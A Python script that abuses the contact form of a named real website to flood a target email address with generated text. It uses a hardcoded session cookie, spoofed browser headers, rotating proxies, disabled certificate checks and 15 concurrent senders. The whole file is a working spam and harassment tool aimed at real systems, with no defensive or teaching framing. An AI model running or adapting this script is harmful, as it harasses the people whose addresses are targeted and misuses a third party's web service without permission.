from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '27ljlno5v0afa35uq2jkps9qi5',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=27ljlno5v0afa35uq2jkps9qi5',
    'Origin': 'http://www.supremeconsultants.in',
    'Pragma': 'no-cache',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://www.supremeconsultants.in/Contact.php',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}

params = {
    'type': 'contactus',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'name': self.get_text(),
            'email': target,
            'mobile': '213123',
            'year': 'Home Loan',
            'comments': self.get_text(),
        }

        response = requests.post(
            'http://www.supremeconsultants.in/online/members/process_dream.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            verify=False,
            proxies=self.get_proxies(), timeout=20
        )
        return response


def main():
    s = 'Processing....'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
